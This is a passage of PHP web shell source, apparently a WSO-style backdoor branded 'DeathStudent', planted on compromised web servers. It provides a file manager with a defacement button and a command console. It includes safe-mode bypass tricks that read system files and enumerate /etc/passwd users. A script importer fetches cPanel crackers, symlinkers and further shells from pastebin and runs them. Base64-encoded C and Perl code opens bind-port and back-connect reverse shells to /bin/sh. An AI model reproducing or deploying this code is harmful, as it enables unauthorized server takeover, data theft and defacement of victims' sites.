            $links[] = array_merge($tmp, array('type' => 'link'));
        elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
            $dirs[] = array_merge($tmp, array('type' => 'dir'));
    }
    $GLOBALS['sort'] = $sort;
    function cmp($a, $b) {
        if($GLOBALS['sort'][0] != 'size')
            return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]])*($GLOBALS['sort'][1]?1:-1);
        else
            return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
    }
    usort($files, "cmp");
    usort($dirs, "cmp");
    usort($links, "cmp");
    $files = array_merge($dirs, $links, $files);
    $l = 0;
    foreach($files as $f) {
        echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
            .'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
        $l = $l?0:1;
    }
    echo '<tr><td colspan=5>
    <input type=hidden name=a value=\'FilesMan\'>
    <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
    <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
    <select name=\'p1\'><option value=\'copy\'>Copy</option><option value=\'move\'>Move</option><option value=\'delete\'>Delete</option>';
    if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){echo '<option value=\'paste\'>Paste</option>'; }
    echo '</select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="index.php" size="10"/>&nbsp;<input type="button" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['cwd']).'\',\'deface\',document.getElementById(\'def\').value)" value="Add your Deface"></td></tr>
    </form></table></div>';
    printFooter();
}

function actionStringTools() {
    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
    if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= dechex(ord($p[$i]));return strtoupper($r);}}
    if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
    
    if(isset($_POST['ajax'])) {
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
        ob_start();
        if(function_exists($_POST['p1']))
            echo $_POST['p1']($_POST['p2']);
        $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
        echo strlen($temp), "\n", $temp;
        exit;
    }
    printHeader();
    echo '<h1>String conversions</h1><div class=content>';
    $stringTools = array(
        'Base64 encode' => 'base64_encode',
        'Base64 decode' => 'base64_decode',
        'Url encode' => 'urlencode',
        'Url decode' => 'urldecode',
        'Full urlencode' => 'full_urlencode',
        'md5 hash' => 'md5',
        'sha1 hash' => 'sha1',
        'crypt' => 'crypt',
        'CRC32' => 'crc32',
        'ASCII to HEX' => 'ascii2hex',
        'HEX to ASCII' => 'hex2ascii',
        'HEX to DEC' => 'hexdec',
        'HEX to BIN' => 'hex2bin',
        'DEC to HEX' => 'dechex',
        'DEC to BIN' => 'decbin',
        'BIN to HEX' => 'bin2hex',
        'BIN to DEC' => 'bindec',        
        'String to lower case' => 'strtolower',
        'String to upper case' => 'strtoupper',
        'Htmlspecialchars' => 'htmlspecialchars',
        'String length' => 'strlen',
    );
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
    echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
    foreach($stringTools as $k => $v)
        echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
        echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".htmlspecialchars(@$_POST['p2'])."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
    if(!empty($_POST['p1'])) {
        if(function_exists($_POST['p1']))
        echo htmlspecialchars($_POST['p1']($_POST['p2']));
    }
    echo"</pre></div>";
    printFooter();
}

function actionFilesTools() {
    if( isset($_POST['p1']) )
        $_POST['p1'] = urldecode($_POST['p1']);
    if(@$_POST['p2']=='download') {
        if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
            if (function_exists("mime_content_type")) {
                $type = @mime_content_type($_POST['p1']);
                header("Content-Type: ".$type);
            }
            $fp = @fopen($_POST['p1'], "r");
            if($fp) {
                while(!@feof($fp))
                    echo @fread($fp, 1024);
                fclose($fp);
            }
        } elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {

        }
        exit;
    }
    if( @$_POST['p2'] == 'mkfile' ) {
        if(!file_exists($_POST['p1'])) {
            $fp = @fopen($_POST['p1'], 'w');
            if($fp) {
                $_POST['p2'] = "edit";
                fclose($fp);
            }
        }
    }
    printHeader();
    echo '<h1>File tools</h1><div class=content>';
    if( !file_exists(@$_POST['p1']) ) {
        echo 'File not exists';
        printFooter();
        return;
    }
    $uid = @posix_getpwuid(@fileowner($_POST['p1']));
    $gid = @posix_getgrgid(@fileowner($_POST['p1']));
    echo '<span>Name:</span> '.htmlspecialchars($_POST['p1']).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
    echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
    if( empty($_POST['p2']) )
        $_POST['p2'] = 'view';
    if( is_file($_POST['p1']) )
        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
    else
        $m = array('Chmod', 'Rename', 'Touch');
    foreach($m as $v)
        echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
    echo '<br><br>';
    switch($_POST['p2']) {
        case 'view':
            echo '<pre class=ml1>';
            $fp = @fopen($_POST['p1'], 'r');
            if($fp) {
                while( !@feof($fp) )
                    echo htmlspecialchars(@fread($fp, 1024));
                @fclose($fp);
            }
            echo '</pre>';
            break;
        case 'highlight':
            if( is_readable($_POST['p1']) ) {
                echo '<div class=ml1 style="background-color: black;color:black;">';
                $code = highlight_file($_POST['p1'],true);
                echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
            }
            break;
        case 'chmod':
            if( !empty($_POST['p3']) ) {
                $perms = 0;
                for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
                    $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
                if(!@chmod($_POST['p1'], $perms))
                    echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                else
                    die('<script>g(null,null,null,null,"")</script>');
            }
            echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
            break;
        case 'edit':
            if( !is_writable($_POST['p1'])) {
                echo 'File isn\'t writeable';
                break;
            }
            if( !empty($_POST['p3']) ) {
                @file_put_contents($_POST['p1'],$_POST['p3']);
                echo 'Saved!<br><script>document.mf.p3.value="";</script>';
            }
            echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
            $fp = @fopen($_POST['p1'], 'r');
            if($fp) {
                while( !@feof($fp) )
                    echo htmlspecialchars(@fread($fp, 1024));
                @fclose($fp);
            }
            echo '</textarea><input type=submit value=">>"></form>';
            break;
        case 'hexdump':
            $c = @file_get_contents($_POST['p1']);
            $n = 0;
            $h = array('00000000<br>','','');
            $len = strlen($c);
            for ($i=0; $i<$len; ++$i) {
                $h[1] .= sprintf('%02X',ord($c[$i])).' ';
                switch ( ord($c[$i]) ) {
                    case 0:  $h[2] .= ' '; break;
                    case 9:  $h[2] .= ' '; break;
                    case 10: $h[2] .= ' '; break;
                    case 13: $h[2] .= ' '; break;
                    default: $h[2] .= $c[$i]; break;
                }
                $n++;
                if ($n == 32) {
                    $n = 0;
                    if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
                    $h[1] .= '<br>';
                    $h[2] .= "\n";
                }
             }
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#red><tr><td bgcolor=red><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#red><pre>'.$h[1].'</pre></td><td bgcolor=#red><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
            break;
        case 'rename':
            if( !empty($_POST['p3']) ) {
                if(!@rename($_POST['p1'], $_POST['p3']))
                    echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
                else
                    die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
            }
            echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
            break;
        case 'touch':
            if( !empty($_POST['p3']) ) {
                $time = strtotime($_POST['p3']);
                if($time) {
                    if(@touch($_POST['p1'],$time,$time))
                        die('<script>g(null,null,null,null,"")</script>');
                    else {
                        echo 'Fail!<script>document.mf.p3.value="";</script>';
                    }
                } else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
            }
            echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
            break;
        case 'mkfile':
            
            break;
    }
    echo '</div>';
    printFooter();
}

function actionSafeMode() {
    $temp='';
    ob_start();
    switch($_POST['p1']) {
        case 1:
            $temp=@tempnam($test, 'cx');
            if(@copy("compress.zlib://".$_POST['p2'], $temp)){
                echo @file_get_contents($temp);
                unlink($temp);
            } else
                echo 'Sorry... Can\'t open file';
            break;
        case 2:
            $files = glob($_POST['p2'].'*');
            if( is_array($files) )
                foreach ($files as $filename)
                    echo $filename."\n";
            break;
        case 3:
            $ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH);
            curl_exec($ch);
            break;
        case 4:
            ini_restore("safe_mode");
            ini_restore("open_basedir");
            include($_POST['p2']);
            break;
        case 5:
            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
                $uid = @posix_getpwuid($_POST['p2']);
                if ($uid)
                    echo join(':',$uid)."\n";
            }
            break;
        case 6:
            if(!function_exists('imap_open'))break;
            $stream = imap_open($_POST['p2'], "", "");
            if ($stream == FALSE)
                break;
            echo imap_body($stream, 1);
            imap_close($stream);
            break;
    }
    $temp = ob_get_clean();
    printHeader();
    echo '<h1>Safe mode bypass</h1><div class=content>';
    echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form>';
    if($temp)
        echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>';
    echo '</div>';
    printFooter();
}

function actionConsole() {
    if(isset($_POST['ajax'])) {
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
        ob_start();
        echo "document.cf.cmd.value='';\n";
        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
        if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))    {
            if(@chdir($match[1])) {
                $GLOBALS['cwd'] = @getcwd();
                echo "document.mf.c.value='".$GLOBALS['cwd']."';";
            }
        }
        echo "document.cf.output.value+='".$temp."';";
        echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
        $temp = ob_get_clean();
        echo strlen($temp), "\n", $temp;
        exit;
    }
    printHeader();

echo '<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array("");
var cur = 0;
function kp(e) {
    var n = (window.Event) ? e.which : e.keyCode;
    if(n == 38) {
        cur--;
        if(cur>=0)
            document.cf.cmd.value = cmds[cur];
        else
            cur++;
    } else if(n == 40) {
        cur++;
        if(cur < cmds.length)
            document.cf.cmd.value = cmds[cur];
        else
            cur--;
    }
}
function add(cmd) {
    cmds.pop();
    cmds.push(cmd);
    cmds.push("");
    cur = cmds.length-1;
}
</script>';
    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
    foreach($GLOBALS['aliases'] as $n => $v) {
        if($v == '') {
            echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
            continue;
        }
        echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
    }
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
        $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
    echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;" readonly>';
    if(!empty($_POST['p1'])) {
        echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
    }
    echo '</textarea><input type=text name=cmd style="border-top:1;width:100%;" onkeydown="kp(event);">';
    echo '</form></div><script>document.cf.cmd.focus();</script>';
    printFooter();
}

function actionLogout() {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo '<title>Get out Now</title><body bgcolor=#000000><center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Flag_of_the_Islamic_Courts_Union.svg/500px-Flag_of_the_Islamic_Courts_Union.svg.png"><br>
<style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
<span style="color:red;font: 20pt audiowide;">Your Are Successfuly LogOut <br>www.facebook.com/Death5tudent</h2></span></center></body>';
}

function actionSelfRemove() {
    printHeader();
    if($_POST['p1'] == 'yes') {
        if(@unlink(SELF_PATH))
            die('Shell has been removed');
        else
            echo 'unlink error!';
    }
    echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
    printFooter();
}
///my editing start here for tools
    function download_remote_file($file_url, $save_to)
    {
        $content = file_get_contents($file_url);

        file_put_contents($save_to, $content);

    }
    
    if (isset($_POST['SymlinkbySmEVK'])) {
        download_remote_file('http://pastebin.com/raw.php?i=PhSk7Kvq', realpath("./") . '/SymlinkbySmEVK.php');
        header("location:SymlinkbySmEVK.php");
   
    }
        if (isset($_POST['SymlinkbyCheetah'])) {
        download_remote_file('http://pastebin.com/raw.php?i=JtPRw7aa', realpath("./") . '/SymlinkbyCheetah.php');
        header("location:SymlinkbyCheetah.php");
   
    }
        if (isset($_POST['SymlinkbyDeathStudent'])) {
        download_remote_file('http://pastebin.com/raw.php?i=pBf7zzu5', realpath("./") . '/sym.py');
        echo "<script>alert('Script is here /sym.py execute it from there.Type in console (Python sym.py)')</script>";
        
   
    }
        if (isset($_POST['CpanelUBH'])) {
        download_remote_file('http://pastebin.com/raw.php?i=74QdAXWR', realpath("./") . '/UBHChack.php');
        header("location:UBHChack.php");
   
    }
        if (isset($_POST['Dblogin'])) {
        download_remote_file('http://pastebin.com/raw.php?i=Q52G9kjJ', realpath("./") . '/Dblogin.php');
        header("location:Dblogin.php");
   
    }
    if (isset($_POST['Cpanel3xp3r'])) {
        download_remote_file('http://pastebin.com/raw.php?i=PUz7x57Q', realpath("./") . '/Cpanel3xp3r.php');
        header("location:Cpanel3xp3r.php");

    }
        if (isset($_POST['mini'])) {
        download_remote_file('http://pastebin.com/raw.php?i=2sKLNXgs', realpath("./") . '/mini.php');
        header("location:mini.php");
   
    }
            if (isset($_POST['ZonehMassPoster'])) {
        download_remote_file('http://pastebin.com/raw.php?i=YF05GQYg', realpath("./") . '/ZonehMassPoster.php');
        header("location:ZonehMassPoster.php");
 
    }
                if (isset($_POST['sym'])) {
        download_remote_file('http://pastebin.com/raw.php?i=Y9ecBAa0', realpath("./") . '/sym.php');
        header("location:sym.php");
   
    }
    
    if (isset($_POST['jump'])) {
        download_remote_file('http://pastebin.com/raw.php?i=TpTzR3Uy', realpath("./") . '/jump.php');
        header("location:jump.php");

    } 

if (isset($_POST['mail'])) {
        download_remote_file('http://pastebin.com/raw.php?i=5zsWVRE1', realpath("./") . '/mail.php');
        header("location:mail.php");

    } 

if (isset($_POST['adminfinder'])) {
        download_remote_file('http://pastebin.com/raw.php?i=iX6kd6pV', realpath("./") . '/adminfinder.php');
        header("location:adminfinder.php");

    } 


if (isset($_POST['wso'])) {
        download_remote_file('http://pastebin.com/raw.php?i=nXaQSEaz', realpath("./") . '/wso.php');
        header("location:wso.php");

    }  

if (isset($_POST['cpDeathStudent'])) {
        download_remote_file('http://pastebin.com/raw.php?i=inFMs7FW', realpath("./") . '/cpDeathStudent.php');
        header("location:cpDeathStudent.php");

    } 


if (isset($_POST['indoxploit'])) {
        download_remote_file('http://pastebin.com/raw.php?i=CQvwdsRQ', realpath("./") . '/indoxploit.php');
        header("location:indoxploit.php");

    } 
	
	if (isset($_POST['scaner'])) {
        download_remote_file('http://pastebin.com/raw.php?i=NLzzEdYW', realpath("./") . '/scaner.php');
        header("location:scaner.php");

    } 
	
	
	
	
	
	
	
	
	
function actionImportScripts() {
    printHeader();
echo '<table border="1px" align="center" id ="Shelltools" cellpadding="10" border-color"green"><tr><td>Just click and get the Script :).</td><tr><td>
<form action ="" method="post">

                                             <input type = "submit" name="cpDeathStudent"                 value ="Cpanel Cracker By D@rk_H1s@n</"></a></td></tr>';
echo '<td><form action =""     method="post"><input type = "submit" name="SymlinkbySmEVK"       value ="Symlink Script By SmEVK"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="SymlinkbyCheetah"     value ="Symlink By Kashmiri Cheetah"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="SymlinkbyDeathStudent"      value ="Symlink Python Script By D@rk_H1s@n"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="CpanelUBH"        value ="Cpanel Auto Cracker"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="Dblogin"              value ="Database Login Script"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="Cpanel3xp3r"      value ="3xp3r Cpanel Cracker"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="mini"     		     value ="Mini Shell"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="ZonehMassPoster"       value ="Zone-h Mass Poster"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="sym"                 value ="SYMLINKER BY GRAY BYTE"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="jump"                 value ="Jump script"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="mail"                 value ="Mailer by leafmailer"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="adminfinder"                 value ="Admin Page Finder"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="wso"                 value ="Wso Shell Pass:H1s@n"></a></td></tr>';
echo '<tr><td><form action ="" method="post"><input type = "submit" name="scaner"                 value ="BackDoor scaner Mini (Shaifullah)"></a></td></tr>';






    
    printFooter();
}


function actionNetwork() {
    printHeader();
    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    
    echo '<h1>Network tools</h1><div class=content>
    <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
    <br /><span>Bind port to /bin/sh</span><br/>
    Port: <input type=\'text\' name=\'port\' value=\'31337\'> Password: <input type=\'text\' name=\'pass\' value=\'DeathStudent\'> Using: <select name="using"><option value=\'bpc\'>C</option><option value=\'bpp\'>Perl</option></select> <input type=submit value=">>">
    </form>
    <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;">
    <br /><br /><span>Back-connect to</span><br/>
    Server: <input type=\'text\' name=\'server\' value="'.$_SERVER['REMOTE_ADDR'].'"> Port: <input type=\'text\' name=\'port\' value=\'1337\'> Using: <select name="using"><option value=\'bcc\'>C</option><option value=\'bcp\'>Perl</option></select> <input type=submit value=">>">
    </form><br>';    
    if(isset($_POST['p1'])) {
        function cf($f,$t) {
            $w=@fopen($f,"w") or @function_exists('file_put_contents');
            if($w)    {
                @fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
                @fclose($w);
            }
        }
